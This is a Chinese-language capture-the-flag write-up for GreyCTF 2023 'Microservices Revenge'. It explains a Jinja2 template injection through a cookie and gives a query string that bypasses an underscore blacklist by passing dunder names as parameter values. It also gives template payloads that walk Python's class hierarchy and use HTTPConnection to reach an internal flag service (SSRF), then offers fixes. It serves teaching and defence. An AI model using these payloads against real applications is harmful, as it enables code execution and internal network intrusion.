# GreyCTF 2023 Microservices Revenge

## 题目简述

管理微服务把 `user` Cookie 直接插入 `render_template_string`，形成 SSTI。网关虽然禁止下划线等字符，但实现只检查 Cookie 值和查询参数的键；危险的双下划线属性名可以放进查询参数值，再由模板通过 `request.args` 间接取用。取得 Python 类层次后，可以从管理容器向内部 flag 服务发起 SSRF。

## 解题过程

使用不含下划线的参数名，把被禁属性放在值中：

```text
?service=adminpage&cl=__class__&mro=__mro__&sub=__subclasses__&item=__getitem__
```

Cookie 本身只引用这些参数：

```jinja2
{{ ""|attr(request.args.cl)
      |attr(request.args.mro)
      |attr(request.args.item)(1)
      |attr(request.args.sub)() }}
```

响应会列出 `object` 的所有子类。从结果中确定 `http.client.HTTPConnection` 的索引后，再构造第二个模板。下面省略重复的属性链，以 `classes[index]` 表示已经取到的类：

```jinja2
{% set conn = classes[index]("rflagpage") %}
{{ conn.request("GET", "/flag") }}
{{ conn.getresponse().read() }}
```

这里 `rflagpage` 是容器网络中的内部服务名。模板在管理服务内部建立 HTTP 连接，请求 `/flag` 并把响应正文渲染到页面，得到：

```text
grey{55t1_bl4ck1ist_byp455_t0_S5rf_538ad457e9a85747631b250e834ac12d}
```

## 方法总结

黑名单只检查“参数放在哪里”，却没有约束模板最终解析出的值，因此可通过间接属性访问绕过。根因仍是把用户输入拼进 Jinja 模板；应把用户名作为普通模板变量传入，并在网络层阻断管理容器访问不必要的内部服务。若必须做 WAF，解析和规范化之后的所有参数值也要使用一致策略，但它不能替代消除 SSTI。
